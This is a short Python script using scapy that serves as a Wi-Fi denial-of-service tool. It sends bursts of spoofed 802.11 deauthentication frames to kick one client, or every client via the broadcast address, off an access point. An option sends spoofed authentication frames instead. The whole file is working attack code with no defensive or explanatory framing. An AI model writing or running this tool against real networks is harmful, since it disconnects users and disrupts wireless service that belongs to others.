from scapy.all import *
import sys
def deauth(wlan_name,ap_mac,station_mac):
    target_mac = station_mac
    gateway_mac = ap_mac
    dot11 = Dot11(type=0,subtype=12, addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
    
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)
    sendp(packet, inter=0.1, count=100, iface=wlan_name, verbose=1)

def auth(wlan_name,ap_mac,station_mac):
    target_mac = station_mac
    gateway_mac = ap_mac
    dot11 = Dot11(type=0,subtype=11,addr1=gateway_mac, addr2=target_mac, addr3=target_mac)

    packet = RadioTap()/dot11/Dot11Auth(seqnum=1)
    sendp(packet, inter=0.1, count=100, iface=wlan_name, verbose=1)

if __name__== "__main__":
    wlan_name = sys.argv[1]
    ap_mac = sys.argv[2]

    if len(sys.argv) == 4:
        station_mac = sys.argv[3]
        deauth(wlan_name,ap_mac,station_mac)
    elif len(sys.argv) ==5 :
        station_mac = sys.argv[3]
        auth_options = sys.argv[4]
        if auth_options == '-auth':
            auth(wlan_name,ap_mac,station_mac)
        else :
            print('option failed')
    elif len(sys.argv) == 3 :
        station_mac = 'ff:ff:ff:ff:ff:ff'
        deauth(wlan_name,ap_mac,station_mac)
    else:
        print("Error")



            

            
        
        
  



    
